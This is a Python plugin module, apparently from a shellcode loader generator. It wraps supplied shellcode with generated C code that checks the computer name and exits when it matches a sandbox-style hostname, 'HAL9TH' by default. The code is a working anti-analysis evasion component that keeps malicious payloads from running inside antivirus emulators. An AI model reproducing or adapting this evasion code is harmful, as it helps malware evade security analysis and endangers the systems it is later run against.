import random
import string

class hostname:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'hostname' in arguments:
            self.hostname = arguments['hostname']
        else:
            self.hostname = 'HAL9TH'

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return f'{self.name}();\n\t' + shellcodestring

    def codeblock(self) -> str:
        return f"""
void {self.name}()
{{
    DWORD nSize = MAX_COMPUTERNAME_LENGTH + 1;
    TCHAR lpBuffer[nSize];

    GetComputerName(lpBuffer, &nSize);

    if (!strcmp(lpBuffer, "{self.hostname}")){{
        exit(0);
    }}
}}
"""